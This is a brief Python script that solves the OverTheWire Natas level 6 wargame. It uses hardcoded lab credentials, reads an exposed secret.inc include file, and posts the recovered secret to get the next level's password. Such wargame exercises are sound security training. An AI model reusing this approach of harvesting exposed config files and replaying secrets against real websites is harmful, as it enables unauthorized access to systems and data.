import requests
url1="http://natas6.natas.labs.overthewire.org"
url2="http://natas6.natas.labs.overthewire.org/includes/secret.inc"
auth_name = 'natas6'
auth_pass = 'fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR'

r=requests.post(url2,auth=(auth_name,auth_pass))
print(r.text)

sec="FOEIUWGHFEEUHOFUOIU"
a=dict(secret=sec,submit="submit")

s=requests.post(url1,auth=(auth_name,auth_pass),data=a)

for i in s.iter_lines():
    if("natas7" in i.decode("utf-8")):
        print(i)
